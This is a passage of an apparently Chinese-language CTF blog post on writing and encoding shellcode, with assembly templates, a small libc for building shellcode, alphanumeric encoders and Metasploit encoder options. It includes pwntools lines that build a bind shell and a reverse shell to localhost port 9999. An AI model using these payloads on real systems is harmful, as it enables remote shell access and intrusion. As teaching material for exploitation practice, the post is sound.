+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>如果使用<code>gcc</code>编译，模板如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">;#gcc -c start.s -o start.o
+</span></span><span class="line"><span class="cl">;#ld -e _start -z noexecstack start.o -o start
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ;// 使用intel语法
+</span></span><span class="line"><span class="cl">    .intel_syntax noprefix
+</span></span><span class="line"><span class="cl">    .text
+</span></span><span class="line"><span class="cl">    .globl  _start
+</span></span><span class="line"><span class="cl">    .type   _start, @function
+</span></span><span class="line"><span class="cl">_start:
+</span></span><span class="line"><span class="cl">    ;// SYS_exit
+</span></span><span class="line"><span class="cl">    mov rdi, 0
+</span></span><span class="line"><span class="cl">    mov rax, 60
+</span></span><span class="line"><span class="cl">    syscall</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以使用<code>nasm</code>，只是编译的命令不一样。</p>
+<h3 class="heading-element" id="1-1-2-内联汇编"><span>1-1-2 内联汇编</span>
+  <a href="#1-1-2-%e5%86%85%e8%81%94%e6%b1%87%e7%bc%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有时候需要调用一下库函数，可以使用内联汇编<a href="https://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html"target="_blank" rel="external nofollow noopener noreferrer">Extended Asm (Using the GNU Compiler Collection (GCC))<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>，直接在程序中使用<code>asm(...);</code>编写内联汇编语句。</p>
+<p>但是在剥离<code>shellcode</code>的时候，需要将<code>call xxxxxxxx</code>的偏移进行修正。</p>
+<h3 class="heading-element" id="1-1-3-使用tiny_libc"><span>1-1-3 使用tiny_libc</span>
+  <a href="#1-1-3-%e4%bd%bf%e7%94%a8tiny_libc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>为了快速、高效、准确地编写出复杂的<code>shellcode</code>，我参考了<code>musl</code>库实现了一个简单的<code>libc</code>库，姑且称之为<code>tiny_libc</code>，项目地址在<a href="https://github.com/RoderickChan/CVE-ANALYZE/tree/main/tiny_libc"target="_blank" rel="external nofollow noopener noreferrer">CVE-ANALYZE/tiny_libc at main · RoderickChan/CVE-ANALYZE (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
+<p>实现了一些基本的系统调用函数、字符串操作函数，<code>glibc</code>常用函数，比如：<code>system、popen、sleep、strcpy、memcpy、puts</code>等等。编译时不依赖任何其他库文件，编译后<code>text</code>段的大小基本不会超过<code>1 page</code>。</p>
+<p>在<code>main.c</code>中编写程序逻辑。如果需要剥离出<code>shellcode</code>，执行<code>get_shellcode.py</code>文件即可在当前目录生成<code>shellcode</code>文件，然后读取该文件，直接输入给目标程序即可。</p>
+<p>这个库当初是为了研究<code>dirty pipe</code>漏洞开发的，因为该漏洞不能写超过一页的<code>shellcode</code>。因此，需要编写复杂的<code>shellcode</code>，又不想写汇编的时候，可以用这个库直接写<code>C</code>，然后一键得到要注入的<code>shellcode</code>。</p>
+<p>如在<code>main.c</code>写入如下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;all_in_one.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1">//----------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;date&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="nf">popen_r</span><span class="p">(</span><span class="s">&#34;cat /etc/issue&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行后输出为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./main
+</span></span><span class="line"><span class="cl">Wed Feb <span class="m">19</span> 21:19:43 CST <span class="m">2023</span>
+</span></span><span class="line"><span class="cl">Ubuntu 20.04.4 LTS <span class="se">\n</span> <span class="se">\l</span>
+</span></span><span class="line"><span class="cl">$ ldd main
+</span></span><span class="line"><span class="cl">        not a dynamic executable</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以很方便的剥离<code>shellcode</code>。</p>
+<h2 class="heading-element" id="1-2-借助工具"><span>1-2 借助工具</span>
+  <a href="#1-2-%e5%80%9f%e5%8a%a9%e5%b7%a5%e5%85%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="1-2-1-pwntools的shellcraft"><span>1-2-1 Pwntools的shellcraft</span>
+  <a href="#1-2-1-pwntools%e7%9a%84shellcraft" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>pwntools</code>的<code>shellcraft</code>定义了非常多的模板，支持的架构有<code>x86/x64/arm/arm64</code>等等。</p>
+<p>点击<a href="http://docs.pwntools.com/en/latest/shellcraft.html"target="_blank" rel="external nofollow noopener noreferrer">pwnlib.shellcraft — Shellcode generation — pwntools 4.10.0dev documentation<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>进行学习。</p>
+<p>使用的示例如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">bindsh</span><span class="p">(</span><span class="mi">9999</span><span class="p">,</span> <span class="s1">&#39;ipv4&#39;</span><span class="p">))</span> <span class="c1"># 绑定shell到999端口</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="c1"># 读取/flag，输出到标准输出</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat2</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">))</span> <span class="c1"># 读取/flag，输出到标准输出</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="s2">&#34;ipv4&#34;</span><span class="p">,</span> <span class="s2">&#34;tcp&#34;</span><span class="p">)</span><span class="o">+</span>\
+</span></span><span class="line"><span class="cl">               <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">,</span> <span class="s1">&#39;ipv4&#39;</span><span class="p">)</span><span class="o">+</span>\
+</span></span><span class="line"><span class="cl">               <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">dupsh</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">               <span class="p">)</span> <span class="c1"># 反弹shell</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 class="heading-element" id="1-2-2-alpha3"><span>1-2-2 Alpha3</span>
+  <a href="#1-2-2-alpha3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>建议使用<a href="https://github.com/TaQini/alpha3"target="_blank" rel="external nofollow noopener noreferrer">TaQini/alpha3: Automatically exported from code.google.com/p/alpha3 (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>这个版本。</p>
+<p>使用需要指定基址寄存器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python ./ALPHA3.py x64 ascii mixedcase rax --input<span class="o">=</span><span class="s2">&#34;shellcode&#34;</span>
+</span></span><span class="line"><span class="cl">./shellcode_x64.sh rax
+</span></span><span class="line"><span class="cl">./shellcode_x86.sh eax</span></span></code></pre></td></tr></table>
+</div>
+</div><p>学习原文地址在<a href="https://www.freebuf.com/articles/system/232280.html"target="_blank" rel="external nofollow noopener noreferrer">Alphanumeric Shellcode：纯字符Shellcode生成指南 - FreeBuf网络安全行业门户<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</p>
+<h3 class="heading-element" id="1-2-3-ae64"><span>1-2-3 AE64</span>
+  <a href="#1-2-3-ae64" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>另一位师傅写的可见字符编码的工具，地址在<a href="https://github.com/veritas501/ae64"target="_blank" rel="external nofollow noopener noreferrer">veritas501/ae64: basic amd64 alphanumeric shellcode encoder (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>，与上一个工具的比较如下：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20230223210315448.png' alt="image-20230223210315448"></p>
+<p>以上两个工具都能生出<code>x86/x64</code>的<code>shellcode</code>，但是<code>alpha3</code>支持的选项更多一点，阅读两者的文档和使用示例即可熟练使用。</p>
+<h3 class="heading-element" id="1-2-4-shellcode-encoder"><span>1-2-4 Shellcode Encoder</span>
+  <a href="#1-2-4-shellcode-encoder" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>指这个工具：<a href="https://github.com/rcx/shellcode_encoder"target="_blank" rel="external nofollow noopener noreferrer">rcx/shellcode_encoder: x64 printable shellcode encoder (github.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>没有前两个好用，有限考虑前两个工具。</p>
+<h3 class="heading-element" id="1-2-5-msf生成"><span>1-2-5 Msf生成</span>
+  <a href="#1-2-5-msf%e7%94%9f%e6%88%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>很多编码的方式，但是对可见字符的编码支持受限。只有<code>x86</code>支持字符编码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Framework</span> <span class="n">Encoders</span> <span class="p">[</span><span class="o">--</span><span class="n">encoder</span> <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">======================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Name</span>                          <span class="n">Rank</span>       <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">    <span class="o">----</span>                          <span class="o">----</span>       <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">brace</span>                     <span class="n">low</span>        <span class="n">Bash</span> <span class="n">Brace</span> <span class="n">Expansion</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">echo</span>                      <span class="n">good</span>       <span class="n">Echo</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">generic_sh</span>                <span class="n">manual</span>     <span class="n">Generic</span> <span class="n">Shell</span> <span class="n">Variable</span> <span class="n">Substitution</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">ifs</span>                       <span class="n">low</span>        <span class="n">Bourne</span> <span class="o">$</span><span class="p">{</span><span class="n">IFS</span><span class="p">}</span> <span class="n">Substitution</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">perl</span>                      <span class="n">normal</span>     <span class="n">Perl</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">powershell_base64</span>         <span class="n">excellent</span>  <span class="n">Powershell</span> <span class="n">Base64</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span><span class="o">/</span><span class="n">printf_php_mq</span>             <span class="n">manual</span>     <span class="n">printf</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">via</span> <span class="n">PHP</span> <span class="n">magic_quotes</span> <span class="n">Utility</span> <span class="n">Command</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">generic</span><span class="o">/</span><span class="n">eicar</span>                 <span class="n">manual</span>     <span class="n">The</span> <span class="n">EICAR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">generic</span><span class="o">/</span><span class="n">none</span>                  <span class="n">normal</span>     <span class="n">The</span> <span class="s2">&#34;none&#34;</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mipsbe</span><span class="o">/</span><span class="n">byte_xori</span>              <span class="n">normal</span>     <span class="n">Byte</span> <span class="n">XORi</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mipsbe</span><span class="o">/</span><span class="n">longxor</span>                <span class="n">normal</span>     <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mipsle</span><span class="o">/</span><span class="n">byte_xori</span>              <span class="n">normal</span>     <span class="n">Byte</span> <span class="n">XORi</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mipsle</span><span class="o">/</span><span class="n">longxor</span>                <span class="n">normal</span>     <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">php</span><span class="o">/</span><span class="n">base64</span>                    <span class="n">great</span>      <span class="n">PHP</span> <span class="n">Base64</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ppc</span><span class="o">/</span><span class="n">longxor</span>                   <span class="n">normal</span>     <span class="n">PPC</span> <span class="n">LongXOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ppc</span><span class="o">/</span><span class="n">longxor_tag</span>               <span class="n">normal</span>     <span class="n">PPC</span> <span class="n">LongXOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ruby</span><span class="o">/</span><span class="n">base64</span>                   <span class="n">great</span>      <span class="n">Ruby</span> <span class="n">Base64</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sparc</span><span class="o">/</span><span class="n">longxor_tag</span>             <span class="n">normal</span>     <span class="n">SPARC</span> <span class="n">DWORD</span> <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x64</span><span class="o">/</span><span class="n">xor</span>                       <span class="n">normal</span>     <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x64</span><span class="o">/</span><span class="n">xor_context</span>               <span class="n">normal</span>     <span class="n">Hostname</span><span class="o">-</span><span class="n">based</span> <span class="n">Context</span> <span class="n">Keyed</span> <span class="n">Payload</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x64</span><span class="o">/</span><span class="n">xor_dynamic</span>               <span class="n">normal</span>     <span class="n">Dynamic</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x64</span><span class="o">/</span><span class="n">zutto_dekiru</span>              <span class="n">manual</span>     <span class="n">Zutto</span> <span class="n">Dekiru</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">add_sub</span>                   <span class="n">manual</span>     <span class="n">Add</span><span class="o">/</span><span class="n">Sub</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">alpha_mixed</span>               <span class="n">low</span>        <span class="n">Alpha2</span> <span class="n">Alphanumeric</span> <span class="n">Mixedcase</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">alpha_upper</span>               <span class="n">low</span>        <span class="n">Alpha2</span> <span class="n">Alphanumeric</span> <span class="n">Uppercase</span> <span class="n">Encoder</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">avoid_underscore_tolower</span>  <span class="n">manual</span>     <span class="n">Avoid</span> <span class="n">underscore</span><span class="o">/</span><span class="n">tolower</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x86</span><span class="o">/</span><span class="n">avoid_utf8_tolower</span>        <span class="n">manual</span>     <span class="n">Avoid</span> <span class="n">UTF8</span><span class="o">/</span><span class="n">tolower</span>
